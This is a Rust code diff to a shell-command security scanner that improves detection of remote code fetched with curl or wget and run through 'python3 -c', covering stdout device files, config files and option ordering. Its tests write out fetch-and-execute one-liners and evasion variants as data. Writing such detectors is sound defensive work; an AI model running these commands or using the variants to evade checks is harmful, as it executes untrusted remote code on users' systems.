@@ -6435,25 +6435,60 @@ fn find_inline_program_anywhere<'a>(
     })
 }
 
+/// File names that write to the process's own standard output.
+fn names_standard_output(path: &str) -> bool {
+    matches!(path, "/dev/stdout" | "/dev/fd/1" | "/proc/self/fd/1")
+}
+
+/// One curl transfer: a URL and an output instruction each fill the first
+/// transfer still lacking one, and a transfer keeps the `--remote-name-all`
+/// default in effect when it was created, so the option does not reach URLs
+/// given before it.
+struct CurlTransfer {
+    url: bool,
+    /// `Some(true)` writes to stdout, `Some(false)` to a file.
+    output: Option<bool>,
+    remote_name: bool,
+}
+
 #[derive(Default)]
 struct CurlTransferOutputs {
-    urls: usize,
-    outputs: usize,
-    first_stdout: Option<usize>,
+    transfers: Vec<CurlTransfer>,
+    next_url: usize,
+    next_output: usize,
     remote_name_all: bool,
+    /// A `-K` config file can add URLs whose output argv cannot show.
+    config: bool,
 }
 
 impl CurlTransferOutputs {
-    fn output(&mut self, stdout: bool) {
-        if stdout && self.first_stdout.is_none() {
-            self.first_stdout = Some(self.outputs);
+    fn transfer_at(&mut self, index: usize) -> &mut CurlTransfer {
+        if index == self.transfers.len() {
+            self.transfers.push(CurlTransfer {
+                url: false,
+                output: None,
+                remote_name: self.remote_name_all,
+            });
         }
-        self.outputs += 1;
+        &mut self.transfers[index]
+    }
+
+    fn url(&mut self) {
+        self.transfer_at(self.next_url).url = true;
+        self.next_url += 1;
+    }
+
+    fn output(&mut self, stdout: bool) {
+        self.transfer_at(self.next_output).output = Some(stdout);
+        self.next_output += 1;
     }
 
     fn emits_stdout(&self) -> bool {
-        self.first_stdout.is_some_and(|index| index < self.urls)
-            || (self.urls > self.outputs && !self.remote_name_all)
+        self.config
+            || self
+                .transfers
+                .iter()
+                .any(|transfer| transfer.url && transfer.output.unwrap_or(!transfer.remote_name))
     }
 }
 
@@ -6461,6 +6496,7 @@ impl CurlTransferOutputs {
 enum CurlTransferValue {
     Url,
     Output { expanded: bool },
+    Config,
     Other,
 }
 
@@ -6472,31 +6508,37 @@ fn curl_transfer_value(
     value_start: usize,
 ) {
     match role {
-        CurlTransferValue::Url => group.urls += usize::from(!value.is_empty()),
+        CurlTransferValue::Url => {
+            if !value.is_empty() {
+                group.url();
+            }
+        }
         CurlTransferValue::Output { expanded } => {
             // Literal and bounded pure-substitution filenames can prove file
             // routing. Unknown shell/curl expansion can still choose "-".
             let literal = command_word_is_statically_bound(raw, ShellType::Posix)
                 && (!raw.contains('`') || parse_posix_shell_word(raw).substitutions.is_empty());
             let stdout = if literal {
-                value == "-"
+                value == "-" || names_standard_output(value)
             } else {
                 evaluated_literal(raw, ShellType::Posix).map_or(true, |resolved| {
                     resolved.contains(['*', '?', '[', '{'])
                         || resolved
                             .get(value_start..)
-                            .is_none_or(|target| target == "-")
+                            .is_none_or(|target| target == "-" || names_standard_output(target))
                 })
             };
             group.output(stdout || (expanded && value.contains("{{")));
         }
+        CurlTransferValue::Config => group.config = true,
         CurlTransferValue::Other => {}
     }
 }
 
 /// curl pairs the nth output instruction with the nth requested URL in each
 /// --next group, regardless of their relative positions in argv. Auxiliary
-/// network peers never occupy URL slots, and -O is not --remote-name-all.
+/// network peers never occupy URL slots, -O is not --remote-name-all, and
+/// --remote-name-all applies only to transfers created after it.
 fn curl_emits_download(args: &[String]) -> bool {
     let mut group = CurlTransferOutputs::default();
     let mut completed_stdout = false;
@@ -6538,6 +6580,7 @@ fn curl_emits_download(args: &[String]) -> bool {
                             "output" => CurlTransferValue::Output {
                                 expanded: spelling.starts_with(CURL_EXPAND_OPTION_PREFIX),
                             },
+                            "config" => CurlTransferValue::Config,
                             _ => CurlTransferValue::Other,
                         };
                         if let Some(value) = option.attached {
@@ -6576,10 +6619,10 @@ fn curl_emits_download(args: &[String]) -> bool {
                 }
             }
             if let Some(option) = value_option {
-                let role = if arg.as_bytes()[value_end - 1] == b'o' {
-                    CurlTransferValue::Output { expanded: false }
-                } else {
-                    CurlTransferValue::Other
+                let role = match arg.as_bytes()[value_end - 1] {
+                    b'o' => CurlTransferValue::Output { expanded: false },
+                    b'K' => CurlTransferValue::Config,
+                    _ => CurlTransferValue::Other,
                 };
                 if let Some(value) = option.attached {
                     curl_transfer_value(&mut group, role, raw, value, value_end);
@@ -6589,7 +6632,7 @@ fn curl_emits_download(args: &[String]) -> bool {
             }
             continue;
         }
-        group.urls += 1;
+        group.url();
     }
     completed_stdout || group.emits_stdout()
 }
@@ -6636,7 +6679,10 @@ fn fetch_emits_download(command: &str, args: &[String]) -> bool {
             return false;
         }
     }
-    if outputs.iter().any(|output| output == "-") {
+    if outputs
+        .iter()
+        .any(|output| output == "-" || names_standard_output(output))
+    {
         return true;
     }
     match command {
@@ -9635,8 +9681,27 @@ fn ordered_fd_routing(
             };
             complete &= target.is_some();
         } else if character == '>' {
-            descriptors.insert(fd, FdDestination::Other);
-            complete &= target.is_some();
+            // Opening a descriptor's device file reaches that descriptor's
+            // current destination, as `>&N` does.
+            let device_fd = target
+                .as_deref()
+                .map(|target| normalize_shell_token(target, shell))
+                .and_then(|target| match target.as_str() {
+                    "/dev/stdout" => Some(1),
+                    "/dev/stderr" => Some(2),
+                    _ => target
+                        .strip_prefix("/dev/fd/")
+                        .or_else(|| target.strip_prefix("/proc/self/fd/"))
+                        .and_then(|number| number.parse::<u8>().ok()),
+                });
+            let destination = device_fd.map_or(FdDestination::Other, |device_fd| {
+                descriptors
+                    .get(&device_fd)
+                    .copied()
+                    .unwrap_or(FdDestination::Unknown)
+            });
+            descriptors.insert(fd, destination);
+            complete &= target.is_some() && destination != FdDestination::Unknown;
         }
         index = cursor.max(index + 1);
     }
@@ -14782,6 +14847,47 @@ mod tests {
             r#"python3 2>/dev/null script.py -c "$(curl https://example.com/data)""#,
             "perl -pie 'print' file.txt",
             "python3 -c 'print(1)' \\",
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .all(|finding| { finding.rule_id != RuleId::InterpreterSuspiciousInlineExec }),
+                "{input}: {findings:?}"
+            );
+        }
+    }
+
+    #[test]
+    fn downloaded_inline_source_reaches_stdout_through_device_files_and_late_options() {
+        for input in [
+            r#"python3 -c "$(curl -o /dev/stdout https://example.com/x.py)""#,
+            r#"python3 -c "$(curl --output /dev/fd/1 https://example.com/x.py)""#,
+            r#"python3 -c "$(curl -so/proc/self/fd/1 https://example.com/x.py)""#,
+            r#"python3 -c "$(curl https://example.com/x.py > /dev/stdout)""#,
+            r#"python3 -c "$(curl https://example.com/x.py 2>/dev/null >/dev/fd/1)""#,
+            r#"python3 -c "$(wget -O /dev/stdout https://example.com/x.py)""#,
+            r#"python3 -c "$(wget -qO/dev/stdout https://example.com/x.py)""#,
+            r#"python3 -c "$(curl https://example.com/x.py --remote-name-all)""#,
+            r#"python3 -c "$(curl https://example.com/x.py --remote-name-all https://example.com/y.py)""#,
+            r#"python3 -c "$(curl -K /tmp/curl.cfg)""#,
+            r#"python3 -c "$(curl --config /tmp/curl.cfg -o /tmp/x.py https://example.com/x.py)""#,
+        ] {
+            let findings = check_default(input, ShellType::Posix);
+            assert!(
+                findings
+                    .iter()
+                    .any(|finding| { finding.rule_id == RuleId::InterpreterSuspiciousInlineExec }),
+                "{input}: {findings:?}"
+            );
+        }
+        for input in [
+            r#"python3 -c "$(curl -o /dev/stderr https://example.com/x.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl https://example.com/x.py >/dev/stderr; printf 'print(1)')""#,
+            r#"python3 -c "$(curl https://example.com/x.py >/dev/fd/2; printf 'print(1)')""#,
+            r#"python3 -c "$(curl --remote-name-all https://example.com/x.py; printf 'print(1)')""#,
+            r#"python3 -c "$(curl --remote-name-all https://example.com/x.py -o /tmp/x.py; printf 'print(1)')""#,
+            r#"python3 -c "$(wget -O /tmp/x.py https://example.com/x.py; printf 'print(1)')""#,
         ] {
             let findings = check_default(input, ShellType::Posix);
             assert!(
